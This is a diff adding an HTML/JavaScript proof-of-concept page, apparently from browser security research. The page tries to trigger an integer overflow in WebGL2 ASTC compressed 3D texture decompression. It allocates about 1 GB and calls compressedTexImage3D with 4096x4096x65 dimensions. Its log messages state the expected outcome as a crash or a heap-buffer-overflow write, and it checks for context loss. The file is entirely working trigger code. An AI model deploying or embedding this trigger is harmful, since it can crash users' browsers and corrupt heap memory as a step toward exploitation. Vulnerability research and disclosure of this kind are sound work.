@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<!-- Finding 1 TRIGGER: attempt compressedTexImage3D with overflow dimensions -->
+<canvas id="c"></canvas><pre id="log"></pre>
+<script>
+const log = s => { document.getElementById('log').textContent += s+'\n'; console.log(s); };
+const gl = document.getElementById('c').getContext('webgl2');
+if (!gl) { log('NO WEBGL2'); }
+
+const astc = gl.getExtension('WEBGL_compressed_texture_astc');
+log('ASTC: ' + (astc ? 'YES' : 'NO'));
+log('MAX_3D: ' + gl.getParameter(gl.MAX_3D_TEXTURE_SIZE));
+log('MAX_TEX: ' + gl.getParameter(gl.MAX_TEXTURE_SIZE));
+
+if (astc) {
+  // Overflow case: 4*4096*4096*65 = 4,362,076,160 → uint32 = 67,108,864
+  const W = 4096, H = 4096, D = 65;
+  // ASTC 4x4 compressed image size = ceil(W/4)*ceil(H/4)*D*16
+  const cW = Math.ceil(W/4), cH = Math.ceil(H/4);
+  const imageSize = cW * cH * D * 16;  // 1,090,519,040 bytes ~ 1 GB
+  log('imageSize (compressed ASTC): ' + imageSize.toLocaleString() + ' bytes');
+
+  // Attempt allocation of 1 GB input data
+  let data;
+  try {
+    data = new Uint8Array(imageSize);
+    log('Allocated ' + imageSize.toLocaleString() + ' bytes OK');
+  } catch(e) {
+    log('Alloc failed: ' + e.message + ' — trying smaller depth');
+    // Fallback: use smaller depth that still overflows
+    // ops=4, w=512, h=512: threshold = 2^32/(4*512*512) = 4096
+    // depth=4097 → 4*512*512*4097 = 4,295,229,440 → uint32=262144
+    // But MAX_3D_TEXTURE_SIZE may cap at 2048
+    log('No trigger possible without 1GB allocation');
+  }
+
+  if (data) {
+    const tex = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_3D, tex);
+    gl.getError(); // clear errors
+
+    log('Calling compressedTexImage3D(' + W + ',' + H + ',' + D + ')...');
+    log('Expected: overflow in DecompressTextureData → crash or heap corruption');
+    try {
+      gl.compressedTexImage3D(
+        gl.TEXTURE_3D, 0,
+        astc.COMPRESSED_RGBA_ASTC_4x4_KHR,
+        W, H, D, 0,
+        data
+      );
+    } catch(e) { log('JS exception: ' + e); }
+
+    const err = gl.getError();
+    const errName = {
+      0:'NO_ERROR', 0x500:'INVALID_ENUM', 0x501:'INVALID_VALUE',
+      0x502:'INVALID_OPERATION', 0x505:'OUT_OF_MEMORY',
+      0x8031:'CONTEXT_LOST'
+    }[err] || '0x'+err.toString(16);
+    log('gl.getError() = ' + errName + ' (' + err + ')');
+
+    if (err === 0) {
+      log('[!] NO GL ERROR — decompression ran. Check for crash/corruption.');
+      log('[!] With ASan build this would show: heap-buffer-overflow WRITE');
+    } else if (err === gl.CONTEXT_LOST_WEBGL || err === 0x8031) {
+      log('[!] CONTEXT LOST — GPU/decoder crashed during decompression!');
+    } else {
+      log('Validation blocked call (err=' + errName + ')');
+    }
+  }
+}
+log('DONE');
+</script>
